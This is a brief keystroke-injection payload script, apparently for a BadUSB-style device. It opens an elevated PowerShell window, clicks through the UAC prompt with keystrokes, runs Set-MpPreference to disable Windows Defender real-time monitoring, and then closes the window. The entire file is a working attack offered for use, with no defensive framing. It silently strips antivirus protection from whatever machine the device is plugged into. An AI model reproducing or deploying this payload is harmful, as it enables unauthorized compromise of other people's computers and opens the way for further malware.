//Opens Powershell with permissions, disables realtime monitoring (Windows Defender, then closes powershell

layout('us');
press("GUI r");
delay(100);
type("powershell")
delay(300)
press("ctrl shift enter")
delay(2000)
press("shift tab")
delay(300)
press("enter")
delay(1000)
type("Set-MpPreference -DisableRealtimeMonitoring $true\n")
delay(3000)
type("exit\n")
